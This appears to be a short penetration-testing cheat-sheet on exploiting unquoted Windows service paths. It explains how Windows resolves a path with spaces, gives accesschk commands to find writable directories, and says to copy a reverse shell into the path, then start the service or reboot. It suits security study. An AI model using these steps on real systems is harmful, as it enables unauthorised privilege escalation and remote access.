# Unquoted Service Path

Example: `C:\Program Files\Application ABC\Common Files\app.exe`

When the service start Windows will check for:

- C:\Program.exe
- C:\Program Files\Application.exe
- C:\Program Files\Application ABC\Common.exe

Before using the full path to `C:\Program Files\Application ABC\Common Files\app.exe`

If we can create any o this files with a reverse shell it’s a win!

```powershell
# Check if we can write to the path
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Application ABC\"

If you get: RW BUILTIN\Users

Then we can write to the directory.

Copy a reverse shell to C:\Program Files\Application ABC\Common.exe

# Start the service
net start app

# Restart Computer
shutdown /r
```